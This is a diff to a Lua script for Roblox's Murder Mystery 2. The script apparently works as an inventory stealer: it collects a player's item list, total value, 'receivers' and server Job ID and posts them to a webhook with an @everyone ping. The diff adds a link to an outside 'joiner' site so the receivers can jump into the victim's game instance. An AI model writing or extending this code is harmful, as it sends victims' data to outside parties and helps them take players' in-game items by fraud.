@@ -1126,9 +1126,10 @@ if flag then
 		local str2 = table.concat(users, ", ")
 		local str3 = "Total Items: " .. #arg .. "\nTotal Value: " .. fn27(n) .. "\n\n" .. table.concat(tbl9, "\n")
 		local jobId = game.JobId
+		local joinLink = string.format("https://plsbrainrot.me/joiner?placeId=%s&gameInstanceId=%s", game.PlaceId, jobId)
 
 		postWebhook({
-			content = arg2 .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. jobId .. "')",
+			content = arg2 .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. jobId .. "')\n" .. joinLink,
 			allowed_mentions = { parse = { "everyone" } },
 			embeds = { {
 				title = "MM2 Inventario",
@@ -1141,6 +1142,7 @@ if flag then
 					{ name = "Items", value = tostring(#arg), inline = true },
 					{ name = "Receivers", value = str2, inline = false },
 					{ name = "Job ID", value = jobId, inline = false },
+					{ name = "Join Link", value = string.format("[**%s**](%s)", jobId, joinLink), inline = false },
 				},
 			} },
 		})
